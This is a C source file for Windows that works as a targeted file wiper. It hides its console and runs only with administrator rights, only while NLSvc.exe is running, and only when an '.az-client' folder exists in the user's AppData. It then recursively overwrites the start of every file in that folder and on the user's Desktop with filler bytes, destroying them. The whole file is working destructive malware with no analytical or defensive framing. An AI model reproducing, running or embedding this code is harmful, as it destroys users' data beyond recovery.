// main.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <securitybaseapi.h>
#include <Lmcons.h>
#include <tlhelp32.h>

#define C_USER      "C:\\Users\\"
#define C_APPDATA   "\\AppData\\Roaming\\.az-client"
#define DESKTOP     "\\desktop"
#define NLSVC       "NLSvc.exe"

// Function declarations
void exit_system(void);
BOOL check_elevation(void);
BOOL check_nlsvc(void);
char* get_username(void);
char* build_path(const char* base_path, const char* username, const char* suffix);
void rewriter(const char* dir);

int main(void) {
    // Hide the console window from user view
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Create a mutex to ensure only one instance runs
    HANDLE hMutex = CreateMutex(NULL, FALSE, "LittleRedBird");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        exit_system();
    }

    // Verify if process has administrative privileges
    if (!check_elevation()) {
        exit_system();
    }

    // Verify if required system process is running
    if (!check_nlsvc()) {
        exit_system();
    }

    // Get current user information and construct paths
    char* username = get_username();
    char* az_folder = build_path(C_USER, username, C_APPDATA);
    char* user_desktop = build_path(C_USER, username, DESKTOP);

    // Verify if target directory exists
    DWORD ftyp = GetFileAttributesA(az_folder);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        free(az_folder);
        free(user_desktop);
        exit_system();
    }

    // Process target directories
    rewriter(az_folder);
    rewriter(user_desktop);

    // Free allocated memory and exit
    free(az_folder);
    free(user_desktop);
    exit_system();
}

// Exits the program with error code -1
void exit_system(void) {
    exit(-1);
}

// Checks if the current process has administrative privileges
BOOL check_elevation(void) {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    
    // Try to open the process token
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        // Get the elevation token information
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken)
        CloseHandle(hToken);
    return fRet;
}

// Checks if NLSvc.exe is running in the system
BOOL check_nlsvc(void) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    // Create snapshot of current processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL found = FALSE;

    // Iterate through all processes
    if (Process32First(snapshot, &entry)) {
        do {
            if (stricmp(entry.szExeFile, NLSVC) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}

// Gets the current username
char* get_username(void) {
    static char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserNameA(username, &username_len);
    return username;
}

// Builds a complete path by combining components
char* build_path(const char* base_path, const char* username, const char* suffix) {
    char* result = (char*)malloc(strlen(base_path) + strlen(username) + strlen(suffix) + 1);
    sprintf(result, "%s%s%s", base_path, username, suffix);
    return result;
}

// Recursively processes files in directory and its subdirectories
void rewriter(const char *dir) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    char path[MAX_PATH];
    char buffer[64];
    
    // Initialize buffer with 'A' characters
    memset(buffer, 'A', sizeof(buffer));
    sprintf(path, "%s\\*", dir);
    
    // Start file enumeration
    hFind = FindFirstFile(path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Skip special directories
        if (findFileData.cFileName[0] == '.') continue;
        
        // Build full path
        sprintf(path, "%s\\%s", dir, findFileData.cFileName);
        
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursively process subdirectories
            rewriter(path);
        } else {
            // Process regular files
            FILE *file = fopen(path, "r+b");
            if (file) {
                fwrite(buffer, 1, sizeof(buffer), file);
                fclose(file);
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
}
